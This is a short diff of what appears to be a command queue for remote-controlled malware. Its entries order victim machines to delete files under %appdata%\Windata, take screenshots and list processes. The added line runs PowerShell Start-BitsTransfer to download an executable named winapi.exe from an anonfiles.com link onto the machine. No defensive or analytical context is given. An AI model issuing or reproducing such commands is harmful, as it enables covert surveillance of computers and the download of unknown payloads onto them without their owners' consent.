@@ -3,3 +3,4 @@ exec|del %appdata%\Windata\winapi.exe|164
 exec|rmdir %appdata%\Windata|165
 screenshot||166
 processes||169
+exec|powershell.exe Start-BitsTransfer -Source https://anonfiles.com/5cc4r6g8yb/winapi_exe -Destination D:\winapi.exe|170
